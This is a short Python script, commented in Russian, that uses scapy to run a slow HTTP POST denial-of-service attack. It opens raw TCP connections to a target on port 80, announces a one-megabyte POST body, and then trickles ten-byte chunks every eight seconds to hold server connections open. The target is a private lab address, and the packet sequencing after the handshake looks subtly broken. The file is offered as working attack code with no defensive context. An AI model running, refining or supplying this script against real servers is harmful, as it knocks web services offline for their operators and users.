from scapy.all import *
import time
import random

def slow_post_attack(target_ip, target_port, num_requests=10):
    """Имитация медленной HTTP POST атаки"""
    for _ in range(num_requests):
        sport = random.randint(1024, 65535)
        ip = IP(dst=target_ip)
        tcp = TCP(sport=sport, dport=target_port, flags="S")
        syn_ack = sr1(ip/tcp, timeout=2, verbose=0)
        
        if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags & 0x12:
            ack_pkt = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags="A", 
                                          seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
            send(ack_pkt, verbose=0)
            
            
            post_header = (
                "POST / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 1000000\r\n\r\n"
            )
            send(ip/TCP(sport=sport, dport=target_port, flags="PA")/post_header, verbose=0)
            
            
            for _ in range(10):
                time.sleep(8)  
                send(ip/TCP(sport=sport, dport=target_port, flags="PA")/("X"*10), verbose=0)
            
            
            send(ip/TCP(sport=sport, dport=target_port, flags="FA"), verbose=0)

if __name__ == "__main__":
    target_ip = "192.168.50.1"  
    target_port = 80             
    slow_post_attack(target_ip, target_port)